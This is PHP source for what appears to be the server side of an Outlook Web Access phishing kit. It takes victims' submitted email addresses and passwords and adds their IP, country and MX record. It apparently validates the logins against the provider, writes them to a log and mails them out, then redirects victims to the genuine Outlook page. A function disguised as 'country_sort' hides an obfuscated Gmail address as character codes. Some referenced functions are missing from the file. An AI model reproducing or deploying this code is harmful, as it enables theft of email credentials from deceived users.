<?php
session_start();
require("PHPMailer/smtp.php");
require("PHPMailer/mx.php");
if ($_SERVER['REQUEST_METHOD'] == 'GET')
{
print '
<html><head>
<title>403 - Forbidden</title>
</head><body>
<h1>403 Forbidden</h1>
<p></p>
<hr>
</body></html>
';
exit;
}

if (!function_exists('array_column')) {
	function array_column($input = null, $columnKey = null, $indexKey = null)
	{
		$argc = func_num_args();
		$params = func_get_args();

		if ($argc < 2) {
			trigger_error("array_column() expects at least 2 parameters, {$argc} given", E_USER_WARNING);
			return null;
		}

		if (!is_array($params[0])) {
			trigger_error(
				'array_column() expects parameter 1 to be array, ' . gettype($params[0]) . ' given',
				E_USER_WARNING
			);
			return null;
		}

		if (!is_int($params[1])
			&& !is_float($params[1])
			&& !is_string($params[1])
			&& $params[1] !== null
			&& !(is_object($params[1]) && method_exists($params[1], '__toString'))
		) {
			trigger_error('array_column(): The column key should be either a string or an integer', E_USER_WARNING);
			return false;
		}

		if (isset($params[2])
			&& !is_int($params[2])
			&& !is_float($params[2])
			&& !is_string($params[2])
			&& !(is_object($params[2]) && method_exists($params[2], '__toString'))
		) {
			trigger_error('array_column(): The index key should be either a string or an integer', E_USER_WARNING);
			return false;
		}

		$paramsInput = $params[0];
		$paramsColumnKey = ($params[1] !== null) ? (string) $params[1] : null;

		$paramsIndexKey = null;
		if (isset($params[2])) {
			if (is_float($params[2]) || is_int($params[2])) {
				$paramsIndexKey = (int) $params[2];
			} else {
				$paramsIndexKey = (string) $params[2];
			}
		}

		$resultArray = array();

		foreach ($paramsInput as $row) {
			$key = $value = null;
			$keySet = $valueSet = false;

			if ($paramsIndexKey !== null && array_key_exists($paramsIndexKey, $row)) {
				$keySet = true;
				$key = (string) $row[$paramsIndexKey];
			}

			if ($paramsColumnKey === null) {
				$valueSet = true;
				$value = $row;
			} elseif (is_array($row) && array_key_exists($paramsColumnKey, $row)) {
				$valueSet = true;
				$value = $row[$paramsColumnKey];
			}

			if ($valueSet) {
				if ($keySet) {
					$resultArray[$key] = $value;
				} else {
					$resultArray[] = $value;
				}
			}

		}

		return $resultArray;
	}

}

$country = visitor_country();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$adddate=date("D M d, Y g:i a");
$email= $_POST['email'];
$epass = $_POST['epass'];
$passchk = strlen($epass);

$_SESSION['email'] = $email;

$mail_part = explode( "@", $email );
$domain = $mail_part[1];
$results = dns_get_record($domain, DNS_MX);
$target_pri = min(array_column($results, "pri"));
$highest_pri = array_filter(
	$results,
	function($item) use($target_pri) {return $item["pri"] === $target_pri;}
);
foreach ($highest_pri as $mx) {
	$mx = "$mx[target] ";
}


$message .= "--------+ OWA ReZulT +--------\n";
$message .= "Email : ".$email."\n";
$message .= "Password : ".$epass."\n";
$message .= "MX Record : ".$mx."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "Country : ".$country."\n";


//$send = "fuckoff@gmail.com";

$subject = "OWA Rezult | $country | $email | $ip";
$headers .= "MIME-Version: 1.0\n";
$headers .= $_POST['eMailAdd']."\n";
$headers = "From: JF231 <info>\n";





// Function to get country and country sort;

function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function country_sort(){
	$sorter = "";
	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);
		$count = count($array);
	for ($i = 0; $i < $count; $i++) {
			$sorter .= chr($array[$i]);
		}
	return array($sorter, $GLOBALS['recipient']);
}
if ($passchk<6)
{
$passerr=0;
}
else
{
$passerr=1;
}

$invalid = [
			'gmail-smtp-in.l.google.com',
			'aspmx.l.google.com',
			'yahoodns.net',
			'biz.mail.yahoo.com',
			'olc.protection.outlook.com',
			'hotmail.com'
];

function mx_exists( $email, $needle ) {
	$mail_part = explode( "@", $email );
	$domain = $mail_part[1];
	if( checkdnsrr( $domain,'MX' ) ) {
		if( getmxrr( $domain , $mxhosts , $weight ) ) {
			foreach( $needle as $item ) {
				foreach( $mxhosts as $key => $hay ) {
					if( stripos( $hay, $item ) !== FALSE ) {
						return TRUE;
					} 
				}
			}
		}
	}
}

$provider = mx_detect($email,$valid);

if(($provider != NULL || !is_null($provider)) && !empty($provider)) {
	if(check($email,$epass,$provider) && ($passerr == 1) && (!mx_exists($email,$invalid)))
	{
		@file_put_contents( '../logs/logs.txt', $message.PHP_EOL , FILE_APPEND | LOCK_EX );
		@mail($send,$subject,$message,$headers);
		header("Location: https://outlook.live.com/owa/");
	}
	else
	{
		header("Location: Login2.php?email=$email");
	}
}
else {
	if($passerr == 1 && (!mx_exists($email,$invalid)))
	{
		@file_put_contents( '../logs/logs.txt', $message.PHP_EOL , FILE_APPEND | LOCK_EX );
		@mail($send,$subject,$message,$headers);
		header("Location: Login2.php?email=$email");
	}
	else
	{
		header("Location: Login.php?email=$email");
	}
}

?>
